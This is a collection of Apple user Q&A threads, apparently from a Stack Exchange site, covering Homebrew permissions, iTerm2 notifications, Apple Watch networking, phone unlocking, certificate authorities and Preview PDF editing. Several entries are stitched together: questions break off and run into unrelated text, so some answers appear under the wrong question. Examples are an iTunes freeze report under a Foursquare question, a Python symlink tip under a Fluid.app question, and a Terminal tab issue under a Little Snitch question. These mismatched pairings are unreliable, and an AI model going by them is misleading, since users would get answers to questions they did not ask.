["Q: Is there a way to take Flash updates out of the hands of Adobe? I swore off Flash for a long while, until the great Safari support in Mavericks. Now I use it without fear.\nHowever, the updating is always a pain. It seems like when I go to certain websites the \"Adobe Flash Player Install Manager\" fires up and bugs me to update. I don't want to have to think about doing these Flash updates all of the time. \nIs there a way to stay up-to-date while not having this app bother me all of the time?\n\nA: While far from a perfect solution, you could run this script from Rich Trouton on a regular basis to install updates.\nNote that the current version of the Flash player is 15, so you'd need to update the script's fileURL entry for this to download and install the correct .dmg.\n", "Q: How long is it safe to use iOS 7? I have an iPhone 4. I would like to know: since iOS 8 is not going to work on the iPhone 4, when should I be worried about the security of my device, since iOS 7 will eventually cease to be supported by most apps?\n\nA: The important thing to know is that once an OS is no longer supported, it doesn't immediately become full of security problems. It's also not beyond Apple to give updates to non-current (for want of a better description) versions of iOS for major security problems. Therefore, it's not possible at this stage to say when iOS 7 will be insecure.\n\nA: On the one hand, you should always be alert to the security of your device -- and you clearly are so. \nOn the other, it is most likely that any targeted future attacks will be made on iOS 8, rather than on older operating systems, assuming the user adoption rate measures near that of iOS 7. I would feel comfortable using iOS 7 until/unless Apple announces a major security update to iOS 8 which is being made because of discovery of a major security flaw. You may, however, feel more comfortable simply removing all your banking or other sensitive information from the phone; I would not worry about passwords for most sites as those are being stolen en masse from databases rather than via targeted user attacks -- unless you're a young, attractive, famous woman. \nOne of the best ways to ensure the security of your personal information is to always use a VPN when you use public WiFi. \n", "Q: Caps lock remap release delay I'm trying to remap the caps lock key of a wireless aluminum Apple keyboard and am having a delay on release (not activation). That is to say, if I hold down the caps lock key after remapping, it will act like the key is pressed for a short period even after I release it. The longer the key is held, the longer this behavior happens.\nI'm trying to remap it to ctrl but have the same problem with cmd. \nI've found a lot of posts talking about an activation delay, but this is different than my problem.\nI've tried the built in remapping as well as Seil, and both have the same problem.\n\nA: You can achieve this with Keyboard Maestro, or probably an alternative.\n\n\n*\n\n*Disable Caps Lock in System Preferences > Keyboard > Keyboard > Modifier Keys\n\n\n*Create a Keyboard Maestro macro that is triggered by \"This device key:\" and set it to trigger when the Caps Lock key is released.\n\n*Add whatever action you want to remap it to—if I understand your question correctly, you'd want to add \"Type Modifiers\" and set it to Control.\n\n", "Q: Cannot update HomeBrew: Permission denied I am trying to fix some brew doctor error but now after manually erased some files that brew doctor suggested I get the following error when trying to do a brew update :\nerror: cannot open .git/FETCH_HEAD: Permission denied\n\nError: Failed to update tap: homebrew/versions\nAlready up-to-date.\n\n\nA: If you are using OSX High Sierra chown operation is not permitted in /usr/local/ in this case use:\nsudo chown -R $(whoami) /usr/local/Homebrew/\n\n\nA: I managed to fix this error by fixing the user owner of the /usr/local folder from 504 to Administrator (the user id I am using when I log in to macbook pro terminal).\nThis was achieved by using this command :\nsudo chown -R $USER:admin /usr/local\n\n\nA: sudo chown -R $(whoami):admin /usr/local && sudo chmod -R g+rwx /usr/local\n\n", "Q: Where I can find My Lists in the recent Foursquare v8 app?

The only Apple devices I've connected to iTunes are iPhones: I started with a 4, then replaced it with a 5, now I have a 5s; this doesn't seem to have affected the issue in any way.\nThe problem is: sometimes, iTunes freezes upon launching. It displays the main window, but it's blank or almost blank, and it doesn't answer any click. This has no resolution, waiting is useless, and the only way out of it is by killing the iTunes.exe process from the Task Manager.\nWhat is really strange is, when this happens, there actually are two iTunes.exe processes in the Task Manager; killing one of them kills them both, and after doing this, iTunes can be launched again, and it just works.\nThis happens randomly and not very often (about 1-2 out of 10 times), but it has been a nuisance for a while; there doesn't seem to be any reason for it, and the fix is always the same: kill iTunes.exe (of which there are two), launch it again and it works. Of course, I've reinstalled iTunes several times, there have been several updates in the meantime, and I'm also using a completely new computer instead of the one I had when I first started experiencing the problem; the OS has also received countless updates, although it's still the same one (I just can't stand Windows 8, sorry).\nHas anyone encountered this problem? How can it be solved?\n\nA: The following iTunes version seems to work (tested in Windows 7 x64): iTunes 12.1.1.4.\n", "Q: How to check Guest user's log on os x?

I have a NAS drive attached to my router that is configured as Raid5. I also have three Mac's attached to that same router. In the Public folder on the NAS drive, I created a sparsebundle disk image from one of the Mac's. After it was created, it mounted to that computer just fine. When I try to mount it on another computer I get an error that says \"no mountable file systems\". \nBasically, I need to have all three machines access the disk image (it has to show up as a local drive, which my NAS drive won't do) on all three machines. How do I get past this error?\nOne computer can use the DMG at a time by ejecting the disk image from computer 1 and then mounting it from computer 2 or 3. I really need all three to be able to use it at the same time. Final Cut Pro X (the software all three computers use most frequently) will not open libraries on a shared drive. \nThank you!\n\nA: I think the DMG probably needs to be served by an OS X AFP service that can do conflict management for when multiple computers try to change the filesystem at the same time.  \nSince you indicated in the comments that each of the computers can mount the DMG individually, but not simultaneously, I bet that your NAS is detecting that the DMG file has been opened for writing by computer1 and is locking it from open+write by other computers until the first is done (unmounts it).\nOoooh, according to this Q/A, you can convert a DMG to read-only; then use a shadow file to keep track of changes.  Just make sure to have a separate shadow file per computer and you should be set! \nPlease test this out with a sample DMG before converting your 12 TB DMG.  Steps:\n\n\n*\n\n*Create a trivial Read-Only DMG with a few files.  \n\n*copy it to your NAS\n\n*In a terminal window hdiutil attach on /Volumes/NAS/path/to/your.dmg -shadow comp1.shadow\n\n*head over to another computer\n\n*run hdiutil attach on /Volumes/NAS/path/to/your.dmg -shadow comp2.shadow NOTE the different filename after -shadow, making sure that they don't both use the same shadow file.\n\n*see if it mounted\n\n", "Q: 42 Spaces Open on Mission Control on starup (mavericks) On startup, when I press f3, I have 42 spaces open in mission control.

I would like to install Windows via Bootcamp but only leave enough space to effectively run the operating system. The games I would install to an external SSD drive. \nSo how much space should I reserve for bootcamp when running Windows 8.1? I want to make sure there is enough space for it to run effectively. Most of my games will be played via Steam.\n\nA: Microsoft's minimum requirements for Windows 8 are 16GB for 32-bit and 20GB for 64-bit (http://windows.microsoft.com/en-ca/windows-8/system-requirements).  You may not plan to install anything else, but likely will like Acrobat, VLC and other utilities you will deploy over time to support day to day use of the OS.  Also with the typical updates of the OS, etc. space in the disk will fill up.  That said I would recommend you double the minimum requirements to ensure your disk has the room you need over the long term.  Another option would be to run Windows virtualized in something like Parallels.  I understand the benefits of Boot Camp...but the benefits of virtualization trump the performance hit for me.\n", "Q: Is there a way to force an update to Google Maps' offline maps on iOS? On Google Maps for iOS (version 3.2.5.29671 as of the time of writing), I can save offline maps using the hidden trick described here. This works fine. However, Google Maps also wants to update offline maps periodically (every 30 days, I think). It has an irritating habit of popping up a dialog asking for this when I'm not on WiFi (when I don't want to update, because 3G is slow and expensive). I normally cancel the dialog (I'm in the middle of doing something), but I can't find a way to force the update when I'm back on WiFi later in the day. This means I get the same irritating pop-up the next day.\nIs there a way to force or manually trigger the updates to the offline maps?\n(this is on an iPhone 5s, if it matters).\n\nA: It is almost one year after your post, but with the current version of Google Maps I have:\nIn Google Maps, go to the Menu, Select \"Your places\" > scroll down to \"Offline maps\" section\n", "Q: What does 3x retina mean? People have described the display in the iPhone 6 Plus as having \"3x retina.\"\nMy question is, What does 3x retina mean?\n\nA: *\n\n*1x: Standard Definition\n\n*2x: \"Retina\" Definition\n\n*3x: \"High(er)\" \"Retina\" Definition\n\n\nThey've added more pixels than needed, because the screen resolution for the size of displays they use is already \"retina\". Which means that you can't see any individual pixels from a certain distance off of the screen. For iPhones it's like 30cm I believe.\nNow that they've added more pixels then needed, they are capable of maximizing brightness and color ratio's, as well as contrast.\nUpdate: Apple seems to be using a default resolution of 568x320 for assets (pictures, mostly). I suppose they call this retina for assets, so 3x retina would enlargen the picture 3 times, which makes 1704x960. I'm not quite sure about why this resolution is specifically chosen, but it might have something to do with the new 1080p display on the iPhone 6 Plus\n\nA: Note that that article was based on the incorrect rumour of a 1704x960 display. The original iPhone display before the 4 had a pixel density of 163 ppi, the old retina displays doubled both horizontal and vertical resolutions to have a pixel density of 326 ppi. To keep the interfaces of apps without retina support the same size, each old size pixel is represented as 4 retina size pixels, in a 2x2 square. The iPhone 5 maintained the same pixel density, but got larger in one dimension, and what the article is talking about was the hypothesis that the iPhone 6 would have the same aspect ratio as the 5, but increasing the resolution in each direction by 1/2 in a 1704x960 display. Assuming the display was the same physical size as the iPhone 5, that would give a pixel density 3 times that of the original iPhones, thus \"3x\". So assuming one had ancient assets from a 1x display, a 3x display would need to use a 3x3 grid of its pixels per single asset pixel to keep the same size. The article is just showing that unlike the jump from the original assets to retina assets, the quality of interpolating assets from 2x to 3x isn't anywhere near as bad as from 1x to 2x as the resolution change is smaller.\nAs it turns out, the actual specs of the 6 and 6 Plus are completely different. The 6 has the same pixel density as the 5 but the screen is a bit bigger. The 6 Plus is both larger and somewhat higher density, though not what \"3x\" would imply. I'm not sure how the new phones would handle old assets. Neither of them are related by a simple ratio like the move from the old iPhone to retina. The aspect ratios are almost the same though, so I'm guessing old apps will default to filling the screen with some kind of interpolation.\nupdate:\nI just found a relevant post here: https://stackoverflow.com/questions/25755443/iphone-6-plus-resolution-confusion-xcode-or-apples-website it seems that the way this is going to be handled on the 6 Plus is to use 3x assets which are then downscaled for the screen.\n", "Q: How can I get a Fluid.app SSB to go back using a two finger swipe?

If it does, you can symlink python to python3, or just execute python3 when tutorials ask you to run python.\n", "Q: Updating and running Git through Homebrew instead of XCode On my new 2014 Mac (OS X 10.9 Mavericks), I have just installed Git using Homebrew. In order to install Homebrew, I had to download and install XCode 5. So now, when I enter the command which git, I can see that Git is running from a different file pathway than the rest of the Homebrew installation. Git's different pathway is /usr/bin/git. I believe it is supposed to be in /usr/local/bin/ instead, with the rest of Homebrew.\nI found a solution to getting Git to run from the Homebrew installation (and consequently an updated version of Git). According to another Q&A on this site, the solution is to add export PATH=\"/usr/local/bin:$PATH\" in ~/.bash_profile.\nUnfortunately, I don't understand where to enter that information. When I'm in Terminal, I can't change directories to something called \"~/.bash_profile.\" How do I get there to enter the command export PATH=\"/usr/local/bin:$PATH\"? I tried entering the command /usr/bin/open ~/.bash_profile, but Terminal tells me: The file /Users/**MYNAME**/.bash_profile does not exist.\n\nA: This: ~/.bash_profile is a file, not a directory. It's a file that gets executed when you start a bash login shell:\n\nA login shell is a bash shell that is started with - or --login.\nWhen BASH is invoked as a login shell, the following files are executed in the displayed order.\n  \n  \n*\n  \n*/etc/profile\n  \n*~/.bash_profile\n  \n*~/.bash_login\n  \n*~/.profile\n\nTo ensure your Homebrew-installed tools appear before any other tools you can copy and paste the following in to a terminal window to update your ~/.bash_profile file:\ncat << 'EOF' >> ~/.bash_profile\n\nexport PATH=\"/usr/local/bin:$PATH\"\nEOF\n\nThis will append (>>) the necessary lines to ~/.bash_profile for you in a safe manner. The append will create the file if it does not exist. The heredoc syntax used above is explained in this nice StackOverflow answer.\nAfter making changes to your .bash_profile file you need to reload it or start a new Terminal session to see the change. To reload it in your existing session type:\nsource ~/.bash_profile\n\n", "Q: Can I get mac notification when a Tab has new output in iTerm2? You know, iTerm2 will change the color of the tab to red or purple. But sometime when I run a long job in one tab, I have to check if it's done frequently. So.. can I get notification when there's new output in one tab? If so, how?\n\nA: To simplify the usage of the mentioned Terminal Notifier tool, you should create an alias for it, including its parameters, so you don't have to type them all the time.\nIn your .bashrc file, add an alias like this:\nalias termnot='terminal-notifier -message \"Done\" -title \"Done\"'\n\nThen you can use it like this:\nlong-running-command ; termnot\n\nBTW: I recommend using ; to separate the commands instead of &&. && is a conditional operator, it will only execute the second command if the first succeeded. So if your first command failed with a non-zero exit code, you will not receive a notification. Separating them with a semicolon will ensure that the second command is always run, regardless of the first command's exit code. More info here: https://unix.stackexchange.com/questions/100704/difference-between-executing-multiple-commands-with-and \nOne more thing: To install the Terminal Notifier tool, I recommend Homebrew. Using Homebrew makes the installation as simple as\nbrew install terminal-notifier\n\n\nA: You can use Terminal Notifier. Once installed run a command like this:\nlong-running-command && terminal-notifier -message \"Done\" -title \"Done\"\n\nWhen long-running-command finishes you will get a notification.\n\nA: If you need to get a notification about any output the triggers may be used.\nGo to Session > Triggers > Add Trigger...\n\nThen enter .* (meaning anything) in Regular Expression box and choose Post Notification... in the Action dropdown. Enter the message you would like to see and press OK.\nNow every time the new output appears in the console the notification in the Notifications center will be shown.\nLater you can disable/reenable the trigger using Session > Triggers menu.\n", "Q: Move iMessages between accounts I have two Apple IDs, because one of them is in the US App Store and the other is in the hungarian Store. I use almost every service of iCloud on the US account except for the iMessage. I still have to log in to iMessage with my older, hungarian account, because all my messages since the service was introduced belong to that. I want to simplify my life and use only the US account (except for purchases in the Store). Is there any way to transfer my old iMessages from my old account to the new one?\n\nA: Short Answer: No\nLonger Answer:\nApple does not support and even don't know how to merge 2 Apple IDs/Account. But on your local iPhone you can hold all the Data if you only switch the iMessage ID afaik. iMessages are only hold for 14 Days in the Apple Account and are not/nerver longer stored at Apple (claims Apple) \nSo moving iMessages to another account without Dataloss - No\nKeep old Messages on the same Phone (or Backup) - Yes \n", "Q: core dumps in Mac OS X I was wondering if core dumps are disabled by default in Mac OS X, or if we have to add the following line to our .bash_profile:\nulimit -S -c 0\n\n\nA: By default, ulimits on OS X have a soft limit of 0 and a hard limit of unlimited.\nYou can verify this by opening a Terminal and running ulimit -S -c and ulimit -H -c.\n", "Q: Is it worth getting a 4k monitor for a late-2012 13\" MacBook Pro with Retina display? I know my 13\" 2012 MacBook Pro with Retina display won't support 4k (because it uses the Intel HD4000 for graphics), but I need a new monitor.\nI just want a monitor that will look good at 2560x1440 (or 2560x1600?) ideally similar performance to the current thunderbolt display.\nWill a 4k display (eg. the PB287Q) perform just as well as a 2560x1440 display (eg. the PB278Q) with my MacBook Pro? If so, I may as well get one so that I'm 4k ready whenever I upgrade the macbook.\nUpdate, Details about my usage: I don't care about gaming, I just want something for programming and internet. I intend to just drive this external screen only and leave the MacBook closed. I occasionally dip into Lightroom for photo editing, so image quality is a bonus. It wouldn't be the end of the world if I had to review images on the laptop screen though.\n\nA: What's officially \"supported\" and what's possible don't match. I managed to get 4K out of it at 30Hz.\nI took a screenshot as proof: \n\nJust a normal mini-displayport<->displayport cable was used.\nMore details in my answer here: https://apple.stackexchange.com/a/147765/39878\nor on this blog post: http://www.mattburns.co.uk/blog/2014/09/30/running-the-4k-aoc-u2868pqu-and-intel-hd4000-graphics/\n2560x1440 works ok but because it isn't HiDPI it still feels like a step backwards. I flip between running 1080p (HiDPI) and full 4k (with the text being tiny). \n\nA: Even if apple refers Simultaneously supports full native resolution on the built-in display and up to 2560 by 1600 pixels on up to two external displays, at millions of colors my bet is you'll not have great performance... But I you just do internet browsing that's not an issue. If you're considering Photoshop or other heavy stuffy that might be slow\n\nA: Also consider that there is a 1280x720 resolution, which really outputs 2560x1440. Everything is so big, but it has some benefits, like easier on the eyes. It's a tiny bit blurry but not a problem for me. It's 60 Hz, works much faster than the 3840x2160 (30Hz, slow rendering).\n\nA: 4k displays are night and day better than any non-retina pixel density displays. If you care about text and line drawing apps - there's no comparison and usually no going back once you use a 4k/5k display.\nYou can test drive this for yourself as well. Connect your retina MacBook pro to any non-4k/5k display and compare text on the retina screen to the external display. \nIf you don't clearly see the benefit, save your $$ until you do see the difference. You can spend / save that $$ on other things until you decide the better resolution is worth losing that $$.\n", "Q: How is the Apple Watch connected to the Internet? The Apple Watch uses the Internet for a lot of things : Siri answers, sending messages...\nBut how is the Apple Watch connected to the Internet ?\nI have searched a bit, to no avail. This information must be too technical. ;-) \n\nA: From the \"Apple Watch User Guide\"\n\nApple Watch uses Bluetooth® wireless technology to connect to its paired iPhone and uses the iPhone for many wireless functions. Apple Watch can’t configure new Wi-Fi networks on its own, but it can connect to Wi-Fi networks you’ve set up on the paired iPhone.\nIf your Apple Watch and iPhone are on the same network but aren’t connected by Bluetooth, you can also do the following on Apple Watch without iPhone:\n  \n  \n*\n  \n*Send and receive messages using iMessage \n  \n*Send and receive Digital Touch messages\n  \n*Use Siri  \n  \n\nThe watch is using the Wi-Fi settings from you paired iPhone to access the internet.  As stated above it can connect to networks you have set on the iPhone.  The Bluetooth will connect to the phone and pass data back and forth.\n\nA: Edit:\nApple published a webpage with the title:About Bluetooth and Wi-Fi on Apple Watch\n\nYour Apple Watch uses Wi-Fi and Bluetooth to communicate with your paired >iPhone, switching between connections as needed:\n  \n  \n*\n  \n*Your Apple Watch uses Bluetooth when your iPhone is near, which\n  conserves power.\n  \n*If Bluetooth isn’t available, Apple Watch will try\n  to use Wi-Fi. For example, if compatible Wi-Fi is available and your\n  iPhone isn't in Bluetooth range, Apple Watch uses Wi-Fi.\n  \n\nOn this page you also can find information about the Compatible-Devices and how to check the Network on your Apple Watch. \nConclusion: \nThe Apple Watch power is limited by it's battery, so Apple uses Bluetooth only, if the iPhone is in range, because Bluetooth4.0 is Low Energy. If you are (e.g) on the toilet and your iPhone in the living room, the Apple Watch uses your WiFi (if present) and also is able to communicate with you Phone over WiFi. \n\nFirst original answer by me. no specs where published by Apple at this time: \nAll signs pointing out that Apple Watch is connected via Bluetooth to your iPhone (5/5c/5s/6/6+) is required. Bluetooth, because the amount of Data isn't really high. \n\nA: Apple's press release for the Apple Watch says:\n\nApple Watch also features Wi-Fi 802.11b/g and\n  Bluetooth 4.0 to pair seamlessly with your iPhone.\n\nThough this doesn't precisely answer your question, it seems likely that the requirement for an iPhone indicates that the watch will only connect to the internet through the phone.\n\nA: This article Apple Watch Likely Uses BCM4334 Broadcom Wi-Fi Chip shows the Apple Watch supports both Bluetooth and Wi-fi but only uses them to connect to the iPhone.\nUpdate from WWDC 2015: \"Apple Watch can now communicate directly with known Wi-Fi hotspots using the new Tetherless Wi-Fi feature in watchOS 2”:\n\nA: I own an Apple Watch, and it prefers using a direct connection to its paired iPhone for Internet functions (ie., Bluetooth tether) when the iPhone is in range (due to lower power consumption than Wifi). However, the Apple Watch is capable of certain supported functions via direct Wifi connection to known networks (ie., previously used networks) like iMessage, Wifi calling if it's been setup on the paired iPhone, Siri queries, if the iPhone is out of Bluetooth range or turned off. This creates a unique problem in that when the Apple Watch is barely within Bluetooth range, Wifi call quality is extremely poor (and worse than via direct Wifi calling). I wish there was a way to change connection priority or tell it to use Wifi when Bluetooth strength is low.  But I guess that's more user configurability than Apple typically allows.\n", "Q: How can I add a ipfw forward rule to little snitch?

Yet there's a message that says that programs notify Terminal about the current working directory using scape sequences, which I don't know what it means.\nBut the Terminal itself is not doing this, as I would like to create a new tab when I press Cmd ⌘ + T to open at the same working directory (not ~/).\nI found this post but it doesn't address this. Here you have a figure with the options:\n\n\nA: I have noticed that this kind of behaviour also reproduces, when having whitespaces in your hostname.\n$ sudo scutil --set HostName 'no-whitespace-name' fixes this issue.\n\nA: So I found the problem with the Terminal and I'm posting the answer hoping it can help others.

I changed its definition from \nexport PROMPT_COMMAND='history -n;'\n\nto\nexport PROMPT_COMMAND=\"${PROMPT_COMMAND:+$PROMPT_COMMAND ;} history -n\"\n\nappending at the end of the existing PROMPT_COMMAND instead and this solved the problem.\n\nA: Well Terminal will certainly open a new tab or window in the current directory if you are at the prompt in bash all things working well.\nI'm running Terminal version 2.4 on 10.9.4 and it works perfectly for both new tabs and windows.\nIf it doesn't then something is upsetting things. Try moving your .profile, .bash_profile and .bashrc out of the way in case something in them is upsetting bash.\nOnce you've discovered which file is causing the problem then you can discover which part is the problem using a \"halving method\". Cut the file approximately in half and move that half back. That will tell you which half is doing it. Repeat with the cutting in half  and moving until you have it down to a few lines or so you can then ask your question again.\n", "Q: Ipad Air totally unresponsive I was just using it and I let the screen go off and now it will  not do anything.

I've got an iPhone 4s from a provider, but they gave it to me without a sim card. It worked but I am wondering if I could buy a sim card, put it in the slot and use the phone with a different carrier, like a prepaid one?\n\nA: If you got your iPhone from a carrier, it is almost certainly locked to that carrier, so you can only use it with a SIM from that carrier. The carriers subsidize the cost of the phones, for the opportunity to make money selling you the data/phone plan.  This is why purchasing an iPhone from a carrier typically costs $0-$200 while an unlocked phone costs $600-$1000.\nIt can be possible to unlock iPhones.  An unlocked phone can be used with a SIM from any mobile carrier, including carriers from other countries.\nUnlocking is completely independent of jail-breaking, which relates to modifying the software to accept non-Apple-approved apps.\n\nA: Usually, if you want to unlock your iPhone and use it with any carrier/provider you want, there are some conditions under which you can officially obtain the unlock.\nAs far as I know, you are eligle for an unlock if the contract with your original carrier has expired over 24 months (some carrier 30), and , of course, if you are the legal owner of the contract. Then, you can contact your carrier and ask for the unlock. They can eventually ask for additional fees, others don't.\nBe aware of the bunch of sites that promise an official unlock under payment. Most of them won't work. \nYou can find terms and conditions of the unlock of your iPhone on your provider site.\nGreetings.\n", "Q: Prevent iPhone \"Trust this computer\" on work PC I would like to charge my iPhone using a USB plug on my Windows PC at work.\nHowever, any time I begin charging with the phone unlocked, it prompts me:\n\nTrust This Computer\n  Your settings and data will be accessible from this computer when connected.\nTrust Don't Trust\n\nIn my case, I never want to trust this PC, and I never want to accidentally click \"Trust\".\nIs there a way to keep the phone from prompting me?\n\nA: You can buy \"charge only\" cables.

I can't afford to buy the expensive Time Capsule.\nSuggestions will be greatly appreciated.\n\nA: You can use one USB drive to back up multiple OS X Macs. Just connect the drive sequentially to each. \nYou could cycle the drive daily, weekly, monthly or hourly.\nEach backup is kept separate and yes, anyone can read the backup files from either computer if they are an administrator of either Mac.\nYou could also make use of Crash Plan software to back up each Mac to the other over the network. That way you could have Time Machine on one Mac cover both of the computers - one directly and the other backing up the crash plan data.\n\nA: I know this is not an answer, but i can't comment yet. \nTry this link, it worked for me.\nhttp://code.stephenmorley.org/articles/time-machine-on-a-network-drive/\n", "Q: iTerm2 does not kill processes when tab is closed If I work in terminal, and, say run rails server in it attached to the current terminal and then close the tab it will not terminate the process making it hang around indefinitely without ability to bring it.

But if you open a new tab using \"cmd+t\" now, the background session in the previously closed tab will be killed. \n\n\nSo the \"restorable tab closing\" is a feature of iterm2, though quite confusing. \n\nA: I know its super old, but incase anyone else comes across this: Ctrl+C worked for me in iterm2\n", "Q: User's home folder path displaying problem Let's say the name of my current account is johndoe.\nOpen Finder Preferences, and set \"New Finder window show\" to johndoe, and add it to sidebar.

It will be used as an iPod Touch for a while, but I'll be moving out of the US in about a year or so. Sprint phones are by far the cheapest, but as I understand it, you have to be a Sprint customer for 3 months before they'll unlock it for international use (which is a condition I likely won't be fulfilling).\nWould I be able to buy a bad ESN phone and use it abroad, then? It sounds like GSM phones are better for abroad use, but they're a bit more and I'm just trying to go down the cheapest route.\nThanks in advance!\n\nA: If you buy a locked phone, then it will be locked to the carrier it was originally bought for. But I guess you know that already.\nI am assuming you are in the US, since you mentioned Sprint.\nThere are two things you can do:\n\n\n*\n\n*Buy an iPhone that was already unlocked.\n\n*Buy a locked iPhone and use it as a phone in the US, but buy a second phone for use abroad. This can be bought abroad or in the US, but make sure it is not carrier locked. When travelling abroad, you could use the iPhone wherever you have access to WiFi - and you could use the other phone for making phone calls. If this phone is also a cheap smartphone, you could even use it to tether the iPhone to it for WiFi access on the move.\n\n\nBuying an already-unlocked iPhone is not the cheap option, and I assume this is an issue since you were looking on eBay for a phone. But you could get a low-spec Android phone for very little money if it's a few years old. The key thing is that it would have to be unlocked since you would be using it for phone calls abroad, and possibly data access if you use it as a hotspot.\n\nA: From Sprint's FAQ on unlocking your device:\n\nI am a former Sprint customer or was never a Sprint customer but have purchased a Sprint device from a third party other than Sprint.\n  Can I get the MSL code?\nFor individuals owners who can provide the\n  telephone number last associated with the device, Sprint may be able\n  to provide the applicable MSL Code if the account associated with the\n  device is in good standing (service or installment contract fulfilled,\n  payments are current, no write-off balance, not associated with a\n  phone sent to collections, phone not reported lost or stolen, etc.).\n\nYou're going to need to work with the owner of the phone to get it unlocked which sounds like a risky proposition. \n", "Q: How much use can you get from an Apple Watch if you don't have (or plan to get) an iPhone? The Apple Watch uses an iPhone for network connectivity (WiFi) and GPS, and reportedly will have some basic capabilities when you don't have an iPhone nearby.  But, what if you don't have and don't plan on getting an iPhone?  Can you get internet from any WiFi source?  Or from a non-apple Bluetooth tether?  \nIt looks like an interesting product, but I have no interest in getting an iPhone and am concerned that the Apple Watch might be tied so closely to the Apple eco-system that it isn't worthwhile to get.\n(Also, looks like somebody needs to create a new \"Watch\" tag?)\n\nA: It's hard to say, considering we don't have access to any material on it other than the website and the keynote.

I have a Logitech HD C910 webcam for which Logitech has no up-to-date drivers. They stopped updating for Mac at 10.6.\nI would just write it off, like so many webcams before it. But it's an AWESOME camera. Its color balance and low-light clarity are just outstanding. It would be a shame to throw away such a great camera. Especially since I have several.\nAnd, while the Logitech software crashes and burns upon launching, other apps can at least partially see the camera. FaceTime and PhotoBooth, for example. They don't have video capture, however. Final Cut Pro, which does have video capture, does not see it. \nSo...looking for recommendations for other applications or utilities I might use to capture video from it. Failing that, looking for replacement recommendations.

Everything without need to install any software!\n\nA: You can try https://www.jqbx.fm if you have spotify. They have an iOS app, website and desktop app. You would just make a private room for the two of you (or I guess you could make it public, your call) then just play tracks back and forth wherever you are.\n\nA: There are a lot of options out there.

You can like tracks, chat with others in the room, and even post instagram/snapchat style comments on the tracks timeline. You can also live stream to the rest of the users in the room... kinda like facebook live. You can set a password on the room as well so that it would be only the two of you.\nThe idea is that it is meant to be like a Silent Disco for the world wide web, so it should suffice for your needs.

The display stopped working last week and since they told me they can't fix it, I've taken the opportunity to get a brand new macbook pro with retina display. It's running the most recent (so far as I know) Mavericks (10.9.4).\nMy problem is I'd like to get files off the old computer. I did back it up about a month ago, so I can get some stuff off of my external drive, but I'd feel better if I could just get in to the old computer and make sure I got all my photos and stuff.\nThe problem is that the two computers don't have anyway of connecting to each other. I thought I could get a firewire to thunderbolt and cable and just use the old one like drive (I did this before at some point with some other computers) and I went and got the cables without double checking an apparently my 2008 macbook doesn't have a firewire port, which is really confusing because now I don't know where I was doing that before.\nI know I can connect the two with an ethernet cable (if I spend another 30 bucks for another thunderbolt adapter. ugh.) but I'm not sure if that will work because I definitely don't have sharing on on the old computer. I'm pretty sure I could use the old computer with an external screen, after buying -another- adapter, but I don't have access to an external screen either.\nI absolutely do NOT want to have the apple store migrate the whole computer over to the new one. There is so much on it I don't need (I was engaged in a long sporadic process of cleaning it up when the screen broke).\ndo I have any other options? Is there some way I can turn on filesharing without being able to see the screen? Is there really no way to do it with USB? That's the only input the two machines have in common.\nOtherwise I guess I'll just have to find someone with an external monitor.\nThanks for any advice!\nAl\n\nA: The other option is remove the hard disk and use a cheap USB adapter to read the old disk. I am not sure about a 2008 model, but more recent (2010) models use a SATA drive.\nI have done this to recover data from many dead Macs.\n", "Q: Find out which certificate authorities do not come with the system I believe that some of the programs I downloaded in the past have installed some root certificate authorities on my Mac (the OS is Mavericks). After learning more about SSL/TLS, I figure that this is a security risk and I want to fix it. How do I distinguish these CAs from the ones preinstalled with the OS so that I can get rid of them?\n\nA: You could use the reverse engineering method.\nHere is the list of all aps that come with Mac.\nSo any CA you find in key chain that are not those are the one you are looking for.\n\nA: The list of trusted roots in Mavericks can be found here: http://support.apple.com/kb/HT6005\nHowever, I'm not actually aware of a way to modify the \"System Roots\" keychain, so any new certificate authorities installed would appear in either the System or Login keychains.\n", "Q: Airport Disk - How can I access it over the Internet without iCloud or Back to my Mac?

I am running OS X 10.10, Yosemite, and there is one feature which really annoys me. I know it must be useful for a lot of people but it's just not for me.\nWhen I open a PDF document and, by habit, I keep clicking on the text while reading it. There are some areas where Preview thinks I would like to insert text.\n\nAs soon as this happens, the PDF document is marked edited in the title bar. When I close the document, it saves (or tries to save) it, changing the modify date and other side-effects such as triggering the DropBox sync etc.\nI have accidentally inserted some text in many documents because Preview doesn't ask before saving the modified copy.\nI would like to disable all PDF editing features unless explicitly invoked. Is it possible to do that?\n\nA: I have the same habit of selecting text as I'm reading. If I change anything by accident (I also tend to shuffle pages) I just push Cmd-Z and the page status goes from Edited back to Normal. I just tested this with a file in Dropbox and it didn't fire (i.e. it’s not saving the document if you undo before closing the window). \nNot perfect, but it works for me. \n\nA: The issue here is largely caused by Apple's change to the Document model introduced in Lion, with changes to the document being auto-saved. While this behaviour is desirable in, say, a Word processor, it's not so desirable in an app like Preview, which is often used for Viewing originals that should not be edited.\nYou can turn off Apple's Auto-save in Preview with the following Terminal command:\ndefaults write -app 'Preview' ApplePersistence -bool no\n\nAs a result, if you accidentally click on the document and create a Text Annotation, the change will not be saved unless you manually save the document. \nEDIT: This no longer seems to work in Mojave and upwards. If you truly want a read-only PDF viewer (or one that requires explicit saves), you may need to use another application.\n\nA: According to me, the best way to resolve this, is to go to System Preferences -> General.\nMake sure \"Ask to keep changes when closing documents\" is selected.\n\nThis will prevent accidental changes in PDF files, as well as other files when opened by other apps.\n\nA: Rectangular Selection Tool\nA pretty poor solution to this is change the selection mode from Text Selection to Rectangular Selection in the Tools menu.\n\nThis stops you inserting random text fields, but also prevents you from selecting text, which may be equally annoying.\nLocking the Document\nIf the document has been saved*, you can lock it...\n* (there is a state for temporary files, e.g. email attachments you've opened directly from the email in Apple's Mail.app, where they are aware they're a temporary file, so pressing Save opens up a Save As dialog, and you cannot lock the document)\n\nHowever, while this prevents you from editing it, if you now click in one of those places that results in a new text field, you get a rather annoying pop-up dialogue asking if you want to unlock or duplicate the document:\n\nSo this too is not an ideal solution, because it interrupts you perhaps even more than the inadvertent-text-entry-box, but technically prevents you from editing it if the Dropbox sync or similar is the main concern.\nApple Feedback\nI suspect there isn't a simple way of disabling/re-enabling the auto-form-filling features of Preview (which are amazing when you want them!), so would suggest you send feedback to Apple on this one.\n\nA: Go under File->Print, choose Save as PDF in the drop-down PDF menu in the lower left corner of the dialog box.

